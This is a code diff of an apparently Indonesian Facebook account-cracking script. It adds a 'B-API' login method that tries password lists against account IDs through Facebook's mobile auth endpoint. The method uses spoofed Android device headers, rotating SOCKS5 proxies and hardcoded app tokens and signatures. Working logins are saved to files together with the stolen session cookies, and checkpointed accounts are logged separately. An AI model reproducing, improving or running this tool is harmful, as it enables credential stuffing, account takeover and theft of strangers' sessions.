@@ -1365,7 +1365,7 @@ def setting():
 
 
     # Input untuk metode login
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]IP[bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]API[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph.facebook.com[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]B-API [ NEW ][bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]API[bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
     if fankylog in ["1", "01"]:
         method.append("fankygraph")
@@ -1802,45 +1802,6 @@ def fankygraphv1(idf, pwv, url):
     loop += 1
 
 
-#----- [ USER-AGENT ] ------#
-import random
-
-ugenfan = []
-
-# ===== WINDOWS USER-AGENTS =====
-win_versions = ['10.0', '6.3', '6.1', '11.0']
-browsers = ['Chrome', 'Firefox', 'Edge']
-chrome_versions = [f"{random.randint(80,120)}.0.{random.randint(4000,6000)}.{random.randint(100,200)}" for _ in range(10)]
-firefox_versions = [f"{random.randint(50,120)}.0" for _ in range(10)]
-edge_versions = [f"{random.randint(90,120)}.0.{random.randint(1000,9999)}.{random.randint(10,150)}" for _ in range(10)]
-
-for _ in range(50):
-    win_ver = random.choice(win_versions)
-    arch = random.choice(['Win64; x64', 'WOW64', 'Win32'])
-    browser = random.choice(browsers)
-    if browser == 'Chrome':
-        ua = f"Mozilla/5.0 (Windows NT {win_ver}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36"
-    elif browser == 'Firefox':
-        ua = f"Mozilla/5.0 (Windows NT {win_ver}; {arch}; rv:{random.choice(firefox_versions)}) Gecko/20100101 Firefox/{random.choice(firefox_versions)}"
-    elif browser == 'Edge':
-        ua = f"Mozilla/5.0 (Windows NT {win_ver}; {arch}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_versions)} Safari/537.36 Edg/{random.choice(edge_versions)}"
-    ugenfan.append(ua)
-
-# ===== ANDROID USER-AGENTS =====
-android_versions = ['10', '11', '12', '13', '14']
-android_devices = [
-    'Redmi Note 10', 'Redmi Note 11', 'Infinix X695', 'Realme C21', 'Samsung SM-A125F',
-    'Oppo A57', 'Vivo 1904', 'Realme Narzo 50A', 'Xiaomi Mi A3', 'Samsung SM-M127F'
-]
-chrome_android_versions = [f"{random.randint(90,123)}.0.{random.randint(4000,6000)}.{random.randint(100,200)}" for _ in range(20)]
-
-for _ in range(50):
-    android_ver = random.choice(android_versions)
-    device = random.choice(android_devices)
-    build = device.split()[0].upper() + random.choice(['RP1A', 'SP1A', 'TP1A']) + f".{random.randint(111111,999999)}.00{random.randint(1,9)}"
-    ua = f"Mozilla/5.0 (Linux; Android {android_ver}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.choice(chrome_android_versions)} Mobile Safari/537.36"
-    ugenfan.append(ua)
-
 
 #-------------------[ CRACK-MAIN ]------------#
 def fanky_b_api(idf, pwv):
@@ -1848,40 +1809,40 @@ def fanky_b_api(idf, pwv):
     rr = random.randint
     rc = random.choice
     bo = random.choice([m, k, h, b, u, x])
-    ua = random.choice(ugenfan)
-    ua2 = "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.166 Safari/537.36"
+    user_agent = random.choice(["Mozilla/5.0 (Linux; Android 13; Redmi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 12; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.79 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Mobile Safari/537.36"])
+    device_info_list = [{"model": "Redmi 9T", "os": "13", "manufacturer": "Xiaomi", "year_class": "2021"}, {"model": "Infinix X682B", "os": "12", "manufacturer": "Infinix", "year_class": "2022"}, {"model": "RMX2185", "os": "11", "manufacturer": "Realme", "year_class": "2020"}, {"model": "M2003J15SC", "os": "10", "manufacturer": "Xiaomi", "year_class": "2019"}]
+    index = [i for i, ua in enumerate(["Redmi 9T", "Infinix X682B", "RMX2185", "M2003J15SC"]) if ua in user_agent][0]
+    device = device_info_list[index]
     ses = requests.Session()
     prog.update(des, description=f" {K2}•{H2} FANKY IP baru kiw {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
     for pw in pwv:
         try:
-            if 'ya' in ualuh:ua = ualu[0]
+            if 'ya' in ualuh: user_agent = ualu[0]
             nip = random.choice(prox)
             proxs = {'http': 'socks5://' + nip}
-            url = "https://iphone.facebook.com/login.php?"
-            requ = ses.get(url)  
-            data = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1), "li": re.search('name="li" value="(.*?)"', requ.text).group(1), "fb_dtsg": re.search('{"dtsg":{"token":"(.*?)"', str(requ.text)).group(1), "try_number": re.search('name="try_number" value="(.*?)"', str(requ.text)).group(1), "unrecognized_tries": re.search('name="unrecognized_tries" value="(.*?)"', str(requ.text)).group(1), "bi_xrwh": re.search('name="bi_xrwh" value="(.*?)"', str(requ.text)).group(1), "__a": re.search('"encrypted":"(.*?)"', str(requ.text)).group(1), "prefill_contact_point": idf, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point", "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false", "is_smart_lock": "false", "_fb_noscript": "true", "email": idf, "pass": pw}
-            head = {'User-Agent': ua, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Referer': 'https://www.facebook.com/', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://www.facebook.com', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-User': '?1', 'Sec-Fetch-Dest': 'document', 'X-FB-LSD': re.search(r'name="lsd" value="(.*?)"', requ.text).group(1), 'X-Requested-With': 'XMLHttpRequest', 'Sec-Ch-Ua': '"Chromium";v="134", "Not-A.Brand";v="99"', 'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"', 'DNT': '1', 'Pragma': 'no-cache'}
-            fankypost = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
-            po = ses.post(fankypost, headers=head, data=data, allow_redirects=False)
-            if "checkpoint" in ses.cookies.get_dict():
+            headers = {"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)), "x-fb-sim-hni": str(random.randint(20000, 45000)), "x-fb-net-hni": str(random.randint(20000, 45000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": random.choice(["MOBILE.HSPA", "MOBILE.LTE", "MOBILE.HSPAP", "MOBILE.EDGE"]), "user-agent": user_agent, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger", "x-fb-client-ip": "true", "x-fb-server-cluster": "true", "x-fb-device-group": str(random.choice(["5120", "5121", "5136", "5160"])), "x-fb-friendly-name": "authenticate", "x-fb-request-analytics-tags": "graphservice", "x-fb-trace-id": str(random.randint(100000000, 999999999)), "x-fb-referer": "chat_tab", "x-fb-client-cdn-log-enabled": "1", "x-fb-device-family": "android", "x-fb-device-name": device["model"], "x-fb-device-os-version": device["os"], "x-fb-device-platform": "ANDROID", "x-fb-device-manufacturer": device["manufacturer"], "x-fb-device-model": device["model"], "x-fb-device-year-class": device["year_class"], "accept-encoding": "gzip, deflate", "accept": "*/*", "connection": "keep-alive"}
+            params = {"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "format": "JSON", "sdk_version": "2", "email": idf, "locale": "en_US", "password": pw, "sdk": "android", "generate_session_cookies": "1", "generate_analytics_claim": "1", "generate_machine_id": "1", "method": "auth.login", "credentials_type": "password", "error_detail_type": "button_with_disabled", "source": "login", "meta_inf_fbmeta": "NO_FILE", "advertiser_id": str(uuid.uuid4()), "currently_logged_in_userid": "0", "device_id": str(uuid.uuid4()), "family_device_id": str(uuid.uuid4()), "session_id": str(uuid.uuid4()), "machine_id": str(uuid.uuid4()), "return_ssl_resources": "0", "try_num": "1", "email_type": "standard", "fb_api_req_friendly_name": "authenticate", "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler", "api_key": "882a8490361da98702bf97a021ddc14d", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
+            url = "https://b-api.facebook.com/method/auth.login"
+            res = ses.get(url, headers=headers, params=params, proxies=proxs,timeout=30).json()
+            if "error_msg" in res and "www.facebook.com" in res["error_msg"]:
                 cp += 1
-                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
+                tree = Tree(Panel.fit(f"{K2}  AKUN CHECKPOINT {P2}", style=color_panel),guide_style="bold grey100")
+                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=color_panel))
+                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=color_panel))
+                tree.add(Panel(f"{M2}{user_agent}{P2}", style=color_panel))
                 prints(tree)
                 open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                 break
-            elif "c_user" in ses.cookies.get_dict():
+            elif "access_token" in res:
                 ok += 1
                 coki = ses.cookies.get_dict()
-                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
-                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
+                kuki = f"datr={coki.get('datr','')}; sb={coki.get('sb','')}; locale=id_ID; c_user={coki.get('c_user','')}; xs={coki.get('xs','')}; fr={coki.get('fr','')};"
+                tree = Tree(Panel.fit(f"{H2}  AKUN SUKSES {P2}", style=color_panel),guide_style="bold grey100")
+                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=color_panel))
+                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=color_panel))
+                tree.add(Panel(f"{U2}{user_agent}{P2}", style=color_panel))
+                tree.add(Panel(f"{U2}{kuki}{P2}", style=color_panel))
                 prints(tree)
                 open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                 break
@@ -1890,6 +1851,7 @@ def fanky_b_api(idf, pwv):
         except requests.exceptions.ConnectionError:
             time.sleep(31)
     loop += 1
+
 
 
 # -----------------------[ SYSTEM-CONTROL ]--------------------#
